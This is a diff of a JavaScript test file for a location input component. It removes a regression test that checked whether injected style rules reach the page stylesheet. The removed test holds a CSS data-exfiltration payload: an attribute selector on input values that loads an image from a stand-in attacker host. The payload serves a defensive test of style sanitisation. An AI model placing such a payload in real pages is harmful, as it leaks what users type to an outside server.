@@ -1843,24 +1843,6 @@ describe("location-input-group", () => {
 				expect(getModalBoxStyle().backgroundColor).not.toMatch(/red|rgb\(255, 0, 0\)/);
 			});
 
-			// on v2 the styles are interpolated into a styled-components rule, so a nested block would otherwise become a
-			// real rule scoped under the modal box, e.g. an attribute selector that loads a resource per matching value
-			it("should not let nested rule blocks in the styles reach the stylesheet", async () => {
-				jest.spyOn(console, "warn").mockImplementation(() => undefined);
-				await renderComponent({
-					overrideField: {
-						locationModalStyles:
-							'@media all { & input[value^="a"] { background-image: image-set("https://evil.example.com/a" 1x) } }',
-					},
-				});
-
-				await waitFor(() => expect(getModalBoxStyle()).toBeTruthy());
-				const rules = Array.from(document.styleSheets).flatMap((sheet) =>
-					Array.from(sheet.cssRules).map((rule) => rule.cssText)
-				);
-				expect(rules.some((rule) => rule.includes("input[value^="))).toBe(false);
-			});
-
 			// jsdom's CSS parser silently discards escaped url() / image-set(), unlike real browsers, so the bypass itself
 			// is covered in style-helper.spec.ts. here we only assert the modal box receives the sanitised output
 			it("should pass the styles through StyleHelper.sanitizeStyleString", async () => {
